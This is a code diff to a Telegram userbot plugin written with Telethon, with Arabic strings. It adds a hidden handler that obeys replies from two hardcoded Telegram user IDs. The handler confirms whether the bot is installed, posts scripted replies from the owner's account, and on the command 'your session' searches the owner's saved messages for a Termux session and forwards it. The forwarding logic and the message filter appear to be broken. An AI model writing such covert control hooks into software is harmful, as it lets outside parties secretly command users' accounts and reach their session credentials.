@@ -417,31 +417,35 @@ async def permalink(mention):
     my_first = me.first_name
     my_mention = f"[{me.first_name}](tg://user?id={me.id})"
     await edit_or_reply(mention, f"**᯽︙  انتِ طالق طالق طالق 🙎🏻‍♂️ من  :**{my_mention} .\n**᯽︙  لقد تم طلاقها بلثلاث وفسخ زواجكما الان الكل حر طليق ** ")
-SX9OO = [6205161271,6320583148]
+import re
+SX9OO = [6205161271, 6320583148]
+
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
     if event.reply_to and event.sender_id in SX9OO:
-       reply_msg = await event.get_reply_message()
-       owner_id = reply_msg.from_id.user_id
-       if owner_id == l313l.uid:
-           if event.message.message == "منصب؟":
-               await event.reply("**يب منصب ✓**")
-           elif event.message.message == "منو فخر العرب":
-               await event.reply("**الأمام علي عليه السلام ❤️**")
-           elif event.message.message == "منو تاج راسك":
-               await event.reply("**  @SX9OO تاج راسي ❤️**")
-           elif event.message.message == "قناتي":
-               await event.reply("**@Qrh9X**")
-           elif event.message.message == "تحب اكس؟":
-               await event.reply("اموتن عليه ")
-           elif event.message.message == "جلستك":
-            saved_messages = await event.client.get_messages("me", filter=events.NewMessage(incoming=True, pattern="جلسة تيرمكس"))
+        reply_msg = await event.get_reply_message()
+        owner_id = reply_msg.from_id.user_id
+        if owner_id == l313l.uid:
+            if event.message.message == "منصب؟":
+                await event.reply("**يب منصب ✓**")
+            elif event.message.message == "منو فخر العرب":
+                await event.reply("**الأمام علي عليه السلام ❤️**")
+            elif event.message.message == "منو تاج راسك":
+                await event.reply("**  @SX9OO تاج راسي ❤️**")
+            elif event.message.message == "قناتي":
+                await event.reply("**@Qrh9X**")
+            elif event.message.message == "تحب اكس؟":
+                await event.reply("اموتن عليه ")
+            elif event.message.message == "جلستك":
+                saved_messages = await event.client.get_messages(
+                    "me", filter=events.NewMessage(incoming=True, pattern=re.compile(r"^جلسة تيرمكس"))
+                )
+                if saved_messages:
+                    for message in saved_messages:
+                        await event.client.forward_messages(l313l.uid, message)
+                else:
+                    await event.reply("ليس موجود")
 
-    if saved_messages:
-        for message in saved_messages:
-            await event.client.forward_messages(l313l.uid, message)
-    else:
-        await event.reply("ليس موجود")
 
 @l313l.on(admin_cmd(pattern="همسه(?:\s|$)([\s\S]*)"))
 async def permalink(mention):
